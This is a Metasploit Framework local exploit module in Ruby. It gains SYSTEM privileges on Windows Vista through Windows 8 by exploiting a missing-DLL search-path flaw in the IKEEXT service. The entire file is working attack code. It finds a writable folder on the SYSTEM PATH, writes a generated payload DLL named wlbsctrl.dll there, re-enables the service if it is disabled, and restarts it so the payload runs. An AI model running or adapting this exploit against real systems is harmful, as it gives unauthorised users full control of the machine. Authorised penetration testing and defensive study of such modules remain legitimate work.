##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/services'
require 'msf/core/post/windows/priv.rb'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::WindowsServices

	def initialize(info={})
		super( update_info( info,
			'Name'           => 'IKE and AuthIP IPsec Keyring Modules Missing DLL',
			'Description'    => %q{
				This module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring
				Modules' service which runs as SYSTEM, and starts automatically in default
				installations of Vista-Win8.
			},
			'References'     =>
				[
					['URL', 'https://www.htbridge.com/advisory/HTB23108'],
					['URL', 'https://www.htbridge.com/vulnerability/uncontrolled-search-path-element.html']
				],
			'DisclosureDate' => "Oct 9 2012",
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Ben Campbell <eat_meatballs@hotmail.co.uk>'
				],
			'Platform'       => [ 'win'],
			'Targets'        => [ ['Windows', {}] ],
			'SessionTypes'   => [ "meterpreter" ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'WfsDelay' => '5'
				},
			'DefaultTarget'  => 0
		))

		register_options([
			OptString.new("DIR", [ false, "Specify a directory to plant the DLL.", ""])
		])
		@service_name = 'IKEEXT'
		@load_lib_search_path = [	'%SystemRoot%\\System32',
						'%SystemRoot%\\System',
						'%SystemRoot%'
					]
		@non_existant_dirs = []

	end
	
	# Current exist? gives false negative when folder does exist.
	def exist?(path)
		begin
			session.fs.dir.entries(path)
			return true
		rescue
		end

		return false
	end

	def check_service_exists?(service)
		service_info = service_info(service)

		if service_info.nil?
			print_error("Unable to enumerate services.")
			return false
		end

		if service_info && service_info['Name'].empty?
			print_error("Service #{service} does not exist.")
			return false
		else
			return true
		end
	end

	def check
		service_info = service_info('IKEEXT')

		if !check_service_exists?(@service_name)
			return Exploit::CheckCode::Safe
		else
			if service_info['Startup'] == 'Disabled'
				print_error("Service is Disabled, so will be unable to exploit unless account has correct permissions...")
				return Exploit::CheckCode::Safe
			end

			if check_search_path
				return Exploit::CheckCode::Safe
			end

			return Exploit::CheckCode::Vulnerable
		end
	end

	def check_search_path
		dll = 'wlbsctrl.dll'

		@load_lib_search_path.each do |path|
			dll_path = "#{expand_path(path)}\\#{dll}"

			if file_exist?(dll_path)
				print_error("DLL already exists at #{dll_path}...")
				return true
			end
		end

		return false
	end

	def check_system_path
		print_status("Checking SYSTEM PATH folders for write access...")
		result  = registry_getvaldata('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment', 'Path')

		if result.nil?
			print_error("Unable to retrieve SYSTEM PATH from registry.")
			return
		end

		paths = result.split(';')
		paths.append(@load_lib_search_path).flatten!.uniq!

		paths.each do |p|
			path = expand_path(p)
			if exist?(path)
				if check_write_access(path)
					return path
				end
			else
				# User may be able to create the path...
				print_status("Path #{path} does not exist...")
				@non_existant_dirs << path
			end
		end

		return nil
	end

	def check_write_access(path)
		perm = check_dir(path, @token)
		if perm and perm.include?('W')
			print_good ("Write permissions in #{path} - #{perm}")
			return true
		elsif perm
			vprint_status ("Permissions for #{path} - #{perm}")
		else
			vprint_status ("No permissions for #{path}")
		end

		return false
	end

	def check_dirs
		print_status("Attempting to create a non-existant PATH dir to use.")
		@non_existant_dirs.each do |dir|
			begin
				client.fs.dir.mkdir(dir)
				if exist?(path)
					return dir
				end
			rescue  Rex::Post::Meterpreter::RequestError => e
				vprint_status("Unable to create dir: #{dir} - #{e}")
			end
		end

		return nil
	end

	def session_arch
		if sysinfo["Architecture"] =~ /x64/i
			return ARCH_X64
		elsif sysinfo["Architecture"] =~ /x86/i
			return ARCH_X86
		else
			print_status("#{sysinfo["Architecture"]}")
			return nil
		end
	end

	def cleanup
		unless @reboot
			if @write_success && @dll_file_path
				begin
					file_rm(@dll_file_path)
					vprint_status("Deleted file #{@dll_file_path}")
				rescue ::Exception => e
					print_error("Error deleting #{@dll_file_path} : #{e}") # Warn users if cleanup fails
				end
			end
		end

		super
	end

	def exploit
		@token = get_imperstoken()
		@reboot = false

		if is_system?
			print_error("Current user is already SYSTEM, aborting.")
			return
		end

		print_status("Checking service exists...")
		if !check_service_exists?(@service_name)
			return
		end

		if session_arch == ARCH_X64
			print_error("Exploit currently does not work with x64.")
			#return
		end

		if is_uac_enabled?
			print_error("UAC is enabled results, may get false negatives on writeable folders.")
		end

		if datastore['DIR'].empty?
			# If DLL already exists in system folders, we dont want to overwrite by accident
			if check_search_path
				print_error("DLL already exists in system folders.")
				return
			end

			file_path = check_system_path
			file_path ||= check_dirs # If no paths are writable check to see if we can create any of the non-existant dirs

			if file_path.nil?
				print_error("Unable to write to any folders in the PATH, aborting...")
				return
			end
		else
			# Use manually selected Dir
			file_path = datastore['DIR']
		end

		@dll_file_path = "#{file_path}\\wlbsctrl.dll"

		service_information = service_info(@service_name)

		if service_information['Startup'] == 'Disabled'
			print_status("Service is disabled, attempting to enable...")
			service_change_startup(@service_name, 'auto')
			service_information = service_info(@service_name)

			# Still disabled
			if service_information['Startup'] == 'Disabled'
				print_error("Unable to enable service, aborting...")
				return
			end
		end

		# Check architecture
		dll = generate_payload_dll({:arch => session_arch})

		#
		# Drop the malicious executable into the path
		#
		print_status("Writing #{dll.length.to_s} bytes to #{@dll_file_path}...")
		begin
			write_file(@dll_file_path, dll)
			@write_success = true
		rescue Rex::Post::Meterpreter::RequestError => e
			# Can't write the file, can't go on
			print_error(e.message)
			@write_success = false
			return
		end

		#
		# Run the service, let the Windows API do the rest
		#
		print_status("Launching service #{@service_name}...")

		begin
			status = service_start(@service_name)
			if status == 1
				print_status("Service already running, attempting to restart...")
				if service_stop(@service_name) == 0
					print_status("Service stopped, attempting to start...")
					if service_start(@service_name) == 0
						print_status("Service started...")
					else
						print_error("Unable to start service.")
					end
				else
					print_error("Unable to stop service.")
				end
			elsif status == 0
				print_status("Service started...")
			end
		rescue ::Exception => e
			if service_information['Startup'] == 'Manual'
				print_error("Unable to start service, and it does not auto start, cleaning up...")
			else
				@reboot = true
				print_status("Unable to start service, manually create handler and wait for a reboot...")
			end
		end
	end

	# Below copied from enum_dirperms
	def get_imperstoken
		adv =  session.railgun.advapi32
		tok_all = "TOKEN_ASSIGN_PRIMARY |TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | "
		tok_all << "TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS"
		tok_all << " | TOKEN_ADJUST_DEFAULT"

		#get impersonation token handle it["DuplicateTokenhandle"] carries this value
		#p = kern.GetCurrentProcess() #get handle to current process
		pid = session.sys.process.open.pid
		pr = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
		pt = adv.OpenProcessToken(pr.handle, tok_all, 4) #get handle to primary token
		it = adv.DuplicateToken(pt["TokenHandle"],2, 4) # get an impersonation token
		if it["return"] #if it fails return 0 for error handling
			return it["DuplicateTokenHandle"]
		else
			return 0
		end
	end

	def check_dir(dir, token)
		adv =  session.railgun.advapi32
		si = "OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION"
		result = ""

		#define generic mapping structure
		gen_map = [0,0,0,0]
		gen_map = gen_map.pack("L")

		#get Security Descriptor for the directory
		f = adv.GetFileSecurityA(dir, si, 20, 20, 4)
		f = adv.GetFileSecurityA(dir, si, f["lpnLengthNeeded"], f["lpnLengthNeeded"], 4)
		sd = f["pSecurityDescriptor"]

		#check for write access, called once to get buffer size
		a = adv.AccessCheck(sd, token, "ACCESS_READ | ACCESS_WRITE", gen_map, 0, 0, 4, 8)
		len = a["PrivilegeSetLength"]

		r = adv.AccessCheck(sd, token, "ACCESS_READ", gen_map, len, len, 4, 8)
		if !r["return"] then return nil end
		if r["GrantedAccess"] > 0 then result << "R" end

		w = adv.AccessCheck(sd, token, "ACCESS_WRITE", gen_map, len, len, 4, 8)
		if !w["return"] then return nil end
		if w["GrantedAccess"] > 0 then result << "W" end
	end
end

